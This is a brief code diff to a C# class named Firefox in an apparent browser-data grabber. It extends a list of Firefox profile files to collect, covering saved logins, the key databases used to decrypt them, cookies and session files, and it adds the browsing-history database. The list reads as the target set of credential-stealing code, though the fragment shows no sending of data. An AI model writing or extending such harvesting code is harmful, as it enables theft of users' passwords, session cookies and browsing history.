@@ -5,7 +5,7 @@ namespace WorkBrowser
 {
     class Firefox : WorkBrowser
     {
-        private string[] _NameFindFiles = { "logins.json", "key3.db" , "key4.db", "signons.sqlite", "sessionCheckpoints.json", "cookies.sqlite", "profiles.ini" };
+        private string[] _NameFindFiles = { "logins.json", "key3.db" , "key4.db", "signons.sqlite", "sessionCheckpoints.json", "cookies.sqlite", "profiles.ini","places.sqlite" };
         public Firefox(string userpath)
         {
 
